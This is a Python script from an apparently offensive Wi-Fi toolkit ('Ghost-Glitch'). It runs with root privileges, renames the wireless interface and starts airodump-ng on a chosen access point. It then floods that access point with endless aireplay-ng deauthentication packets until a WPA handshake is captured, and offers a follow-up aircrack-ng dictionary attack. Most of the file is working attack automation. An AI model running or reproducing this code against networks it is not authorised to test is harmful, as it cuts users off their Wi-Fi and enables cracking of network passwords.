
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# python scripts/C_captureHandshake.py wlan0mon C2:94:AD:CC:FC:60 52
# iBrokenShadow 
# Made by Broken Shadow

import psutil
import subprocess
import time
import csv
import pandas as pd
import os
import shutil
import sys
import signal
import threading
import select
from X_requirement import check_installation
requirements_satisfied = check_installation()

# print(O+ f"[[ Selected interface: \"{interface}\" ]]\n.\n.\n" + GR)

# Console colors
W = '\033[37m'          # white (normal)
GR = '\033[32m'         # white (normal)
R = '\033[31m'          # red
G = '\033[32m'          # green
O = '\033[38;5;208m'    # orange
Y = '\033[33m'          # Yellow
B = '\033[34m'          # blue
P = '\033[35m'          # purple
C = '\033[36m'          # cyan


# Getting Version of File
try:
    pathOFScript = os.path.abspath(os.path.dirname(__file__))
    pathOFScript = pathOFScript[:-5]
    versionFile = pathOFScript + ".version"
    with open(versionFile, "r") as file:
        versionOfScript = file.read()
except: 
    versionOfScript = "--"
    pass


def bann_text():
    # clear()
    logo = """ 
░██████╗░██╗░░██╗░█████╗░░██████╗████████╗░░░░░░░██████╗░██╗░░░░░██╗████████╗░█████╗░██╗░░██╗
██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝░░░░░░██╔════╝░██║░░░░░██║╚══██╔══╝██╔══██╗██║░░██║
██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░█████╗██║░░██╗░██║░░░░░██║░░░██║░░░██║░░╚═╝███████║
██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░╚════╝██║░░╚██╗██║░░░░░██║░░░██║░░░██║░░██╗██╔══██║
╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░░░░░░░╚██████╔╝███████╗██║░░░██║░░░╚█████╔╝██║░░██║
░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░░░░░╚═════╝░╚══════╝╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
    """
    print(R + logo + G)
    print(R+ f"\t\t\t\t\t\t\t\t- by iBrokenShadow ({versionOfScript})\n\n\n" + G)
    
def ReportError():
    header = "\n\n\n\n\t-------------------------------------------------------------"
    header2 = "\t-------------------------------------------------------------"
    MainHeader = "\tREPORT ANY ERROR FOR FIXES (Thanks for your Contribution)"
    mainMessage = """
        Given Contacts : Telegram  : https://t.me/iBrokenShadow
                       : Instagram : https://www.instagram.com/iBrokenShadow/
                       : Github    : https://github.com/iBrokenShadow
    """
    Terrr2 = "\tThanks! visit https://ibrokenshadow.com"
    
    print(C + header + W)
    
    print(R + MainHeader + W)
    print(W + mainMessage + W)
    print(G + Terrr2 + W)
    
    print(C + header2 + W)


    
def run(cmd):
    subprocess.run(cmd)

# REQUIREMENTS
def requirements():
    try:
        if requirements_satisfied == False:
            clear() ; print(R) ; run(["figlet", "ERROR !!!"])
            print("\n\nMake Sure to Satisfy all Requirement First...")
            print(GR) ; input() ; sys.exit(0)
    except KeyboardInterrupt: sys.exit(0)
    except: sys.exit(0)
    
    

subprocess.run("clear")

def is_run_with_sudo():
    return os.geteuid() == 0

if is_run_with_sudo() == False:
    print("ERROR!!!\n\nPlease run with sudo privileges...\n\n")
    print("\n") ; input("Press Any Key to quit...")
    sys.exit()

# Variables Passed from 1st Program
try:
    INTERFACE = sys.argv[1]
    BSSID = sys.argv[2]
    CHANNEL = sys.argv[3]
    PythonFilepath = sys.argv[4]
    mode = sys.argv[5]
except:
    print("SYNTAX ERROR!!!\n\nexample:\n\tpython -u \"scriptName.py\" 'interface-name' 'BSSID' 'CHANNEL' \"PATH TO ghostglitch.py File\" 'mode [1 or 2]'")
    print("\n") ; 
    try: input("Press Any Key to quit...")
    except KeyboardInterrupt: sys.exit(0)
    sys.exit(0)

def exit_pause():
    print("\n") ; input("Press Any Key to quit...") ; clear() #; exit()
    subprocess.run("python captureHandshake.py")

def Del_Current_Line():
    sys.stdout.write("\r\033[K")
    sys.stdout.flush()

def Del_Pre_Line():
    print("\033[F\033[K", end="", flush=True)

# CLEAR SCREEN
def clear():
    subprocess.run("clear")




# SIMPLE ANIMATION
def loading_animation(text):
    chars = "/—\|"  # Characters for the animation
    start_time = time.time()
    while time.time() - start_time < 2:
        for char in chars:
            sys.stdout.write('\r' + text + char)
            sys.stdout.flush()
            time.sleep(0.1)
            
# Slowly Type something instead of sudden print   
def SlowType(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.01)
    print()  # Print a newline after printing the sentence slowly

def clear_lines(num_lines):
    # Clear lines from the current line up to num_lines lines above
    for _ in range(num_lines):
        sys.stdout.write("\033[F")  # Move cursor to the beginning of the previous line
        sys.stdout.write("\033[K")  # Clear the line
    sys.stdout.flush()

# SMART LOAD
def SmartLoading():
    char = '.'
    start_time = time.time()
    i = 0
    while time.time() - start_time < 1:
        print(char) ; time.sleep(0.1) ; i += 1
    clear_lines(i)
  
# Fastly Type something instead of sudden print   
def FastType(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.005)
    print()  # Print a newline after printing the sentence slowly


# Check if Monitor Mode is already Enabled
def is_monitor_mode_enabled(interface):
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            return True
        else:
            return False
    except subprocess.CalledProcessError as e:
        print(f"Error checking monitor mode for {interface}: {e}")
        return False


# IGNORE
def backToMain():
    a = 1

def MonitorModeDisbaled_RedirectProgramA(monitorModeFile):
    check = is_monitor_mode_enabled(INTERFACE)
    if check == False:
        clear() ; print(f"MONITOR MODE IS DISBALED ON '{INTERFACE}'\n.\n.\n.\n")
        loading_animation("Wait... Turning On Monitor Mode") ; Del_Current_Line() ; clear()

        subprocess.run(['sudo', 'python', monitorModeFile])
        sys.exit()
        
        
        
# MONITOR MODE DISABLE
def disable_monitor_mode(interface):
    global modeOFmonitorDisable
    def disable_monitor_mode_iwconfig(interface):
        texxt = "Turning Monitor Mode Off on : " + interface + " "
        loading_animation(texxt, 1.5) ; Del_Current_Line()

        subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
        text = W+"\t[+] Interface ", interface, " Turned Down..."
        SlowType(text) ; time.sleep(1)

        subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"], check=True)
        text = "\t[+] Interface ", interface, " Mode Changed..."
        SlowType(text) ; time.sleep(1)

        subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
        text = "\t[+] Interface ", interface, " Turned UP..."
        SlowType(text) ; time.sleep(1)

        subprocess.run(["sudo", "service", "NetworkManager", "start"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        SlowType("\t[+] Network Manager service started..."+GR) ; time.sleep(1)
        sys.stdout.write("\033[F\033[K" * 4)

        clear() ; bann_text()
        text = f"Monitor Mode Disabled on : {interface}\n"
        SlowType(text)
        time.sleep(1) ; print("-----" *5)
        subprocess.run(["iwconfig", interface])
        print("-----" *5) ; print("\n")
                    
    def disable_monitor_mode_airmonNG(interface):
        print(W)
        processCHECK = subprocess.run(["sudo", "airmon-ng", "stop", interface], check=True)
        interface = interface[:-3]
            
        time.sleep(0.5) ; clear() ; bann_text() ; SmartLoading()
        text = O+ f"[[ Selected interface: \"{interface}\" ]]\n.\n.\n" + GR ; SlowType(text)

        text = f"Monitor Mode Disabled on : {interface}\n" ; SlowType(text)
        subprocess.run(["iwconfig", interface])
        print("-----" *5) ; print("\n")
        
        
    
    # MAIN ASE
    try:
        disable_monitor_mode_airmonNG(interface)
        modeOFmonitorDisable = 0
        
    except subprocess.CalledProcessError as e:
        time.sleep(0.5) ; clear() ; bann_text() ; SmartLoading()
        text = O+ f"[[ Selected interface: \"{interface}\" ]]\n.\n.\n" + GR ; SlowType(text)
            
        disable_monitor_mode_iwconfig(interface)
        modeOFmonitorDisable = 1
    
    except Exception as e:
        clear() ; print("\n\n") ; text = f"ERROR: {e}" ; SlowType(text) ; ReportError() ; exit_pause()
    except KeyboardInterrupt:
        SlowType("\n\n\nERROR: BYE") ; ReportError() ; exit_pause()


        
        
# Get Connected Client's BSSIDs for Deauthentication attack on each clients that get connected        
def get_connected_clients_from_csv(csv_file):
    with open(csv_file, 'r') as file:
        # Skip first 4 lines
        for _ in range(5):
            next(file)
        # Extract client BSSIDs from the first column
        connected_clients = [line.split(',')[0].strip() for line in file]
    return connected_clients



def CountCSVLines(CapturedCSV_File):
    try:
        with open(CapturedCSV_File, "r") as file:
            line_count = sum(1 for _ in file)
            return line_count
    except:
        subprocess.run("clear")
        print("ERROR! File Not Found...") ; sys.exit(0)



# MOVE ALL FILES TO PATH
def moveFilestoPath(files):
    try:
        for file in files:
            shutil.move(file, path)
            
    except KeyboardInterrupt: 
        sys.exit(0)
        
        
        
# Change Interface Name to Ghost        
def change_interface_name(current_name, new_name):
    def get_next_interface_name(base_name):
        i = 1
        while True:
            if current_name.endswith("mon"):
                interface_name = f"{base_name}{i}mon"
            else: interface_name = f"{base_name}{i}"
            
            if not check_interface_exists(interface_name):
                return interface_name
            i += 1

    def check_interface_exists(interface_name):
        try:
            subprocess.check_output(['ip', 'link', 'show', interface_name])
            return True
        except subprocess.CalledProcessError:
            return False

    def rename_interface(current_name, new_name):
        try:
            subprocess.run(['ip', 'link', 'set', current_name, 'down'])
            subprocess.run(['ip', 'link', 'set', current_name, 'name', new_name])
            subprocess.run(['ip', 'link', 'set', new_name, 'up'])
        except Exception as e:
            print(f"\n\n\n\nERROR 128: {e}")
            time.sleep(0.2) ; ReportError() ; sys.exit(1)

    try:
        next_name = get_next_interface_name(new_name)
        rename_interface(current_name, next_name)
        return next_name
    except Exception as e:
        print(f"\n\n\n\nERROR 169: {e}")
        time.sleep(0.2) ; ReportError() ; sys.exit(1)
        
        

#----------------------------------------------------------------------
                            # POST DEMON
#----------------------------------------------------------------------
        
def PostDemon(isItCaptured):
    try:
        subprocess.run("clear")
        bann_text()
        
        def printDecor():
            time.sleep(0.5)
            print(O + "------------------------------------------------------------------------------------------------" + GR)
            print(O + "------------------------------------------------------------------------------------------------" + GR)
            i = 0
            while i<3:
                time.sleep(0.12)
                print(O+ "." + GR) ; i+=1
        
        postDmeonFile_Cap = PythonFilepath +"utils/postdemon_Cap.py"
        postDmeonFile_NotCap = PythonFilepath +"utils/postdemon_NoCap.py"
        
        
        ############################
        # ---------------------------------------------------------------------------------------------
        ############################ 
        
        
        # CHECK IF HANDSHAKE ACTUALLY CAPTURED OR NOT
        if isItCaptured == "DONE":          # HANDHSHAKE CAPTURED
            clear() ; bann_text() ; printDecor()
            
            SlowType(O + "\n-// HANDSHAKE CAPTURED //-" +GR)
            text = G + "\n [+] Captured Files    : " + W + f"\"{path}\"" + W ; FastType(text)
            airodumpFile = path[:-20] + "airodumped_BS_list-01.csv"
            text = G + " [+] Airodump-ng Dumps : " + W + f"\"{airodumpFile}\"" + W ; FastType(text)
            text = G + " [+] Handshake File    : " + W + f"\"{path}glitched-01.cap\"" + W ; FastType(text)
            print("\n\n")
            
            text = G+ "\t\t", "-"*30 ; SlowType(text)
            text = C+ "\t\t\t--What Next?--\n", "\t\t", "-"*30 ; SlowType(text)
            time.sleep(0.1)
            print("\n  [x] " + P + "Start Dictionary Attack (Aircrack-ng)" + O + "            | -> Press ENTER" + G)
            time.sleep(0.1)
            print("  [x] " + P + "Manual Mode || Exit and print All Details" + O + "        | -> Press '2'" + G)
            time.sleep(0.1)
            print("  [x] " + P + "Start Wifi Analyzer Using WireShark (Work in P)" + O + "  | -> Press '3'" + G)
            time.sleep(0.1)
            print("  [x] " + P + "Start Hitting Another Target" + O + "                     | -> Press '4'" + G)
            time.sleep(0.1)
            print("  [x] " + P + "Disable Monitor Mode & Exit" + O + "                      | -> Press '5'" + G)
            time.sleep(0.1)
            SlowType("\n  -----------> ") ; Del_Pre_Line()
            response = input("  -----------> ")
            
            
            
        ############################
        # ---------------------------------------------------------------------------------------------
        ############################ 
        
           
                    
        else:                       # HANDHSHAKE NOT CAPTURED XXXX
            print("\n") ; printDecor()
            SlowType(R + "\n-// SORRY! HANDSHAKE NOT CAPTURED //-" +GR)
            text = R + "\n [+] Captured Files    : " + W + f"\"{path}\"" + W ; FastType(text)
            airodumpFile = path[:-20] + "airodumped_BS_list-01.csv"
            text = R + " [+] Airodump-ng Dumps : " + W + f"\"{airodumpFile}\"" + W ; FastType(text)
            
            time.sleep(0.5) ; input("\n\n...Try Again or Debug issues with Adapter / Use different Techiniques")
            
            
            
        ############################
        # ---------------------------------------------------------------------------------------------
        ############################ 
        
        
            
        
    except KeyboardInterrupt:
        print("\n\n") ; time.sleep(0.2) ; ReportError() ; sys.exit(1)
    except Exception as e: 
        pass
        print(f"ERROR 648: {e}")
        time.sleep(0.2) ; ReportError() ; sys.exit(1)

########################################## --END--  ###################################################







#######################################################################################################
#                                           MAIN FUNCTION                                             #
#######################################################################################################

try:
    # text = G+ "\t\t", "-"*30 ; SlowType(text)
    # text = C+ "\t\t\t--What Next?--\n", "\t\t", "-"*30 ; SlowType(text)
    # time.sleep(0.1)
    # print("\n  [x] " + P + "Start Dictionary Attack (Aircrack-ng)" + O + "            | -> Press ENTER" + G)
    # time.sleep(0.1)
    # print("  [x] " + P + "Manual Mode || Exit and print All Details" + O + "        | -> Press '2'" + G)
    # time.sleep(0.1)
    # print("  [x] " + P + "Start Wifi Analyzer Using WireShark (Work in P)" + O + "  | -> Press '3'" + G)
    # time.sleep(0.1)
    # print("  [x] " + P + "Start Hitting Another Target" + O + "                     | -> Press '4'" + G)
    # time.sleep(0.1)
    # print("  [x] " + P + "Disable Monitor Mode & Exit" + O + "                      | -> Press '5'" + G)
    # time.sleep(0.1)
    # SlowType("\n  -----------> ") ; Del_Pre_Line()
    # response = input("  -----------> ")

    
    RES = 0 ; requirements()
    # PythonFilepath = os.path.abspath(os.path.dirname(__file__)) + "/"
    current_directory = os.getcwd() + "/"
    MonitorModeDisbaled_RedirectProgramA(PythonFilepath + "ghost_glitch.py")

    CSVfilePath = PythonFilepath + "airodumped_BS_list-01.csv"
    path = PythonFilepath + "CaptureHandshake_BS" + "/"
    CAPfileName = path + "glitched"
    
    files = [current_directory+"glitched-01.csv", current_directory+"glitched-01.cap", current_directory+"glitched-01.log.csv", current_directory+"glitched-01.kismet.csv", current_directory+"glitched-01.kismet.netxml"]
    filesH = [CAPfileName+"-01.csv", CAPfileName+"-01.cap", CAPfileName+"-01.log.csv", CAPfileName+"-01.kismet.csv", CAPfileName+"-01.kismet.netxml"]
    
    # Remove All files Necessary and Create the Folder to place all files
    try:
        subprocess.run(["rm", "-r", path, "--force"])
        for file in files: os.remove(file)
    except: pass
    try:
        for fileh in filesH: subprocess.run(["rm", "-r", fileh, "--force"])
        for fileh in filesH: os.remove(fileh)
    except: pass
    
    try: os.remove(path)
    except: pass
    try: os.makedirs(path)
    except: pass
    subprocess.run("clear")
    
    
                
                
#----------------------------------------------------------------------
#                               DEMON
#----------------------------------------------------------------------
    Old_INTERFACE_NAME = INTERFACE
    AbraKaDabra = change_interface_name(INTERFACE, "Ghost")   # Name Changed with suffix Ghost
    INTERFACE = AbraKaDabra ; clear()
    


    # # Command 1: Run airodump-ng in the current terminal
    # print(["airodump-ng", INTERFACE, "--bssid", BSSID, "--channel", CHANNEL, "--write", "glitched", '--write-interval', '1', '--ignore-negative-one']) ; input()
    proc1 = subprocess.Popen(["airodump-ng", INTERFACE, "--bssid", BSSID, "--channel", CHANNEL, "--write", "glitched", '--write-interval', '1', '--ignore-negative-one'], stdout=subprocess.PIPE, text=True) ##### , '--write-interval', '1', '--ignore-negative-one'
    RES = 1                     
                                                                                                                    
    
    time.sleep(1)
    # Command 2: Run aireplay-ng in a new xterm window
    aireplay_command = [
        "xterm",
        "-e",
        f"aireplay-ng -0 0 -a {BSSID} {INTERFACE}"
    ]
    proc2 = subprocess.Popen(aireplay_command)

    # Monitor output of command 1
    while True:
        line = proc1.stdout.readline().strip()
        print(line)  # Print the output of command 1
        
        if "handshake" in line.lower():  # Check if the word "handshake" is in the line
            proc2.terminate() ; proc1.terminate()
            # proc2.kill() ; proc1.kill()
            break
        
    if RES==1: 
        moveFilestoPath(files)
        PostDemon("DONE")


    # --------------------------------------------------------------------------------------------
    # POST PostDemon












#--------------------END-----------------------
    time.sleep(0.2) ; ReportError() ; sys.exit(1)


except KeyboardInterrupt:
    try:
        if RES==1: 
            moveFilestoPath(files)
            PostDemon("NOT_DONE")
        
        proc2.kill() ; proc1.kill()
        time.sleep(0.2) ; ReportError() ; sys.exit()
    except:
        time.sleep(0.2) ; ReportError() ; sys.exit()
    
except Exception as e:
    proc2.kill() ; proc1.kill()
    print(f"\n\nERROR: {e}") ; time.sleep(0.2) ; ReportError() ; sys.exit()
